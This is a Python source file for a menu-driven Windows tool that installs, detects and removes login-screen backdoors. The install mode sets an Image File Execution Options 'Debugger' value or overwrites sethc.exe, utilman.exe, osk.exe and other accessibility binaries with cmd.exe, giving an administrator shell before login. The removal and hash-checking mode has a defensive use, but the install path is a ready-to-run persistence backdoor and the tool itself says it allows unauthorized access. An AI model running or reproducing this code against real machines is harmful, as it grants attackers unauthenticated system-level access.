import os
import winreg
from config import *
def install_registry_backdoor(path, fileName):
    print(bar)
    print("Adding " + fileName + " backdoor to registry.")
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
        try:
            winreg.SetValueEx(key, 'Debugger', 0, winreg.REG_SZ, cmdPath)
        except Exception as e:
            print(e)
            print("Error: Could not create sub-key. Please run with Administrator privileges.")
            return
    except Exception as e:
        print(e)
        print("Error: Could not create key. Please run with Administrator privileges.")
        return
    print(fileName + " debugger registry key successfully added.")


def install_backdoor(filePath, registryPath):
    print(bar)
    fileName = os.path.basename(filePath).strip(' ')
    while True:
        print("Would you like to install debugger key for cmd.exe in the registry,\nCopy cmd.exe over " + fileName + ", or both?")
        print("[A]dd debugger key for cmd.exe.")
        print("[C]opy " + fileName + " over with cmd.exe")
        print("[B]oth.")
        print("[R]eturn to Main Menu.")
        choice = input("[>]").lower()
        if choice == 'a':
            install_registry_backdoor(registryPath, fileName)
            return
        elif choice == 'c':
            replace_file(filePath, fileName)
            return
        elif choice == 'b':
            install_registry_backdoor(registryPath, fileName)
            replace_file(filePath, fileName)
            return
        elif choice == 'm':
            return
        else:
            print("Invalid Input.")

# TODO: Make backups go to /backups folder
def replace_file(path, fileName):
    print(bar)
    print("WARNING: This will copy over " + fileName + "!")

    print("Backing up " + fileName + " to the current directory.\nYou can restore from backup by doing [R]emove Backdoor option from the Main Menu.")
    calculate_sha256(path)
    if(sha_is_incorrect(path)):
        print("Since " + fileName + " has been replaced, the backup cannot be completed.")
        return
    else:
        try:
            os.system("copy " + path)
        except Exception as e:
            print(e)
            return

    print("Replacing " + fileName + " with cmd.exe.")
    try:
        print("Granting Administrators full privilege on " + fileName)
        os.system('TAKEOWN /a /F "' + path + '"')
        os.system('icacls.exe "' + path + '" /grant Administrators:F')
        print("Copying cmd.exe over " + fileName)
        os.system("copy " + cmdPath + " " + path)

    except Exception as e:
        print(e)
        return


def run_sfc():
    while True:
        print("Would you like to run Windows System File Checker?")
        choice = input("[Y/N]: ").lower()
        if choice == 'y':
            try:
                os.system('sfc /Scannow')
                # findstr /c:"[SR]" %windir%\logs\cbs\cbs.log >%userprofile%\Desktop\sfcdetails.txt
                cbsLog = open('C:/Windows/Logs/CBS/CBS.txt')
                for line in cbsLog:
                    if 'Found :' in line:
                        print(line)
            except Exception as e:
                print(e)
            return
        elif choice == 'n':
            return
        else:
            print("Incorrect input.")


# TODO: Restore from backups folder
def backup_restore(path):
    print(bar)
    if os.path.isfile(path):
        fileName= os.path.basename(path).strip(' ')
        print("Attempting to restore " + fileName + " from local backup.")
        # Check if local backup file has been replaced
        if(sha_is_incorrect(fileName)):
            print("Since " + fileName + " has been replaced, the restore from local backup cannot be completed.")
            run_sfc()
        else:
            try:
                os.system("copy " + fileName + " " + path)
            except FileNotFoundError as e:
                print(e)
                print("File backup not found.")
                run_sfc()

        print(fileName + " backup restore was successful.")
    else:
        print("Backup Restore file at path: " + path + " not found.")


# TODO: Make more compact
def sha_is_incorrect(path):
    fileName = os.path.basename(path).strip(' ')
    print("Validating " + fileName + " hash against cmd.exe, explorer.exe, and powershell.exe hashes.")
    sha256 = calculate_sha256(path)
    if (sha256 == cmdSha):
        print(fileName + " file has been replaced with cmd.exe!")
        print(fileName + " Sha256:\n" + sha256)
        print("cmd.exe Sha256:\n" + cmdSha)
        return True
    elif(sha256 == explorerSha):
        print(fileName + " file has been replaced with explorer.exe!")
        print(fileName + " Sha256:\n" + sha256)
        print("explorer.exe Sha256:\n" + explorerSha)
        return True
    elif(sha256 == powershellSha):
        print(fileName + " file has been replaced with powershell.exe!")
        print(fileName + " Sha256:\n" + sha256)
        print("powershell.exe Sha256:\n" + powershellSha)
        return True
    else:
        return False

def remove_backdoor(path):
    print(bar)
    fileName = os.path.basename(path).strip(' ')
    if(sha_is_incorrect(path)):
        backup_restore(path)
    else:
        print(fileName + " hashes do not match cmd.exe, explorer.exe, or powershell.exe")

    print("Performing " + fileName + " registry analysis.")
    registryPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + fileName
    # test if key exists
    try:
        print("Attempting to open " + fileName + " key.")
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registryPath, 0, winreg.KEY_ALL_ACCESS)
    except:
        print(fileName + " debugger backdoor key not found.")
        return

    # key was found
    print(fileName + " backdoor debugger registry entry found, attempting to remove.")
    try:
        os.system('REG DELETE "HKLM\\' + registryPath + '" /f')
    except Exception as e:
        print(e)
        return
    print("The " + fileName + " backdoor registry key has been removed.")


if __name__ == "__main__":
    print(header)
    while True:
        print(bar)
        print("[I]nstall Backdoor.\n[R]emove Backdoor.\n[C]onfigure Settings.\n[E]xit the Program.")
        choice = input("[>]").lower()
        # install backdoor
        if choice == 'i':
            print(bar)
            print("*WARNING: THIS WILL ALLOW UNAUTHORIZED ACCESS*")
            print("Which backdoor would you like to install?")
            print("[S]ticky Keys (sethc.exe).")
            print("[U]tility Manager (utilman.exe).")
            print("[D]isplay Switch (dispalyswitch.exe).")
            print("[M]agnifier (magnify.exe).")
            print("[N]arrator (narrator.exe).")
            print("[O]n-Screen Keyboard (osk.exe).")
            print("[A]ll.")
            print("[R]eturn to the Main Menu.")
            choice = input("[>]").lower()
            if choice == 's':
                print("At the login screen, press [Shift 5 times]\nto open command prompt with Administrator Privileges.")
                install_backdoor(sethcPath, sethcRegistryPath)
            elif choice == 'u':
                print("At the login screen, press [Windows Key + U]\nto open command prompt with Administrator Privileges.")
                install_backdoor(utilmanPath, utilmanRegistryPath)
            elif choice == 'd':
                print("At the login screen, press [Windows Key + P]\nto open command prompt with Administrator Privileges.")
                install_backdoor(displaySwitcherPath, displaySwitcherRegistryPath)
            elif choice == 'm':
                print("At the login screen, press [Windows Key + U]\nand select 'Magnify' to open command prompt\nith Administrator Privileges.")
                install_backdoor(magnifierPath, magnifierRegistryPath)
            elif choice == 'n':
                print("At the login screen, press [Windows Key + U]\nand select 'Narrator' to open command prompt\nwith Administrator Privileges.")
                install_backdoor(narratorPath, narratorRegistryPath)
            elif choice == 'o':
                print("At the login screen, press [Windows Key + U]\nand select 'On-Screen Keyboard' to open command\nprompt with Administrator Privileges.")
                install_backdoor(oskPath, oskRegistryPath)
            # NOTE: Does not install utilman.exe backdoor, as that would disallow access to the
            # narrator.exe, osk.exe, and magnify.exe backdoors.
            elif choice == 'a':
                print("At the login screen, to open the command prompt with Administrator Privileges,\n"
                    "Perform any of the following:\n"
                    "[Shift 5 times]\n"
                    "[Windows Key + U] and select 'Narrator'\n"
                    "[Windows Key + U] and select 'On-Screen Keyboard'\n"
                    "[Windows Key + U] and select 'Magnify'\n"
                    "[Windows Key + P]")
                install_backdoor(sethcPath, sethcRegistryPath)
                install_backdoor(displaySwitcherPath, displaySwitcherRegistryPath)
                install_backdoor(magnifierPath, magnifierRegistryPath)
                install_backdoor(narratorPath, narratorRegistryPath)
                install_backdoor(oskPath, oskRegistryPath)
            elif choice == 'r':
                continue
            else:
                print("Incorrect input.")
                continue
        # remove backdoor
        elif choice == 'r':
            print("Detecting and removing all backdoors.")
            remove_backdoor(sethcPath)
            remove_backdoor(utilmanPath)
            remove_backdoor(narratorPath)
            remove_backdoor(oskPath)
            remove_backdoor(magnifierPath)
            remove_backdoor(displaySwitcherPath)
        elif choice == 'c':
            # print("[D]isable Windows accessibility options in registry. (currently doesnt work)")
            # print("[E]nable Windows accessibility options in registry. (currently doesnt work)")
            print("[B]ackup sethc.exe, utilman.exe, narrator.exe, osk.exe, magnify.exe, and displayswitch.exe")
            print("[P]erform backup restore.")
            print("[R]eturn to the Main Menu.")
            choice = input("[>]").lower()
            # TODO: Registry files do not work
            # if choice == 'd':
            #     os.system("AccessibilityOFF.reg")
            # elif choice == 'e':
            #     os.system("AccessibilityON.reg")
            if choice == 'b':
                try:
                    os.system('copy ' + sethcPath + ' ' + cwd + '\\backups\\')
                    os.system('copy ' + utilmanPath + ' ' + cwd + '\\backups\\')
                    os.system('copy ' + narratorPath + ' ' + cwd + '\\backups\\')
                    os.system('copy ' + oskPath + ' ' + cwd + '\\backups\\')
                    os.system('copy ' + magnifierPath + ' ' + cwd + '\\backups\\')
                    os.system('copy ' + displaySwitcherPath + ' ' + cwd + '\\backups\\')
                except Exception as e:
                    print(e)
                    continue
            elif choice == 'p':
                backup_restore(sethcPath)
                backup_restore(utilmanPath)
                backup_restore(narratorPath)
                backup_restore(oskPath)
                backup_restore(magnifierPath)
                backup_restore(displaySwitcherPath)
            elif choice == 'r':
                continue
            else:
                print("Incorrect input.")
                continue
        elif choice == 'e':
            print("Exiting...")
            exit(0)
        else:
            print("Incorrect input.")
            continue
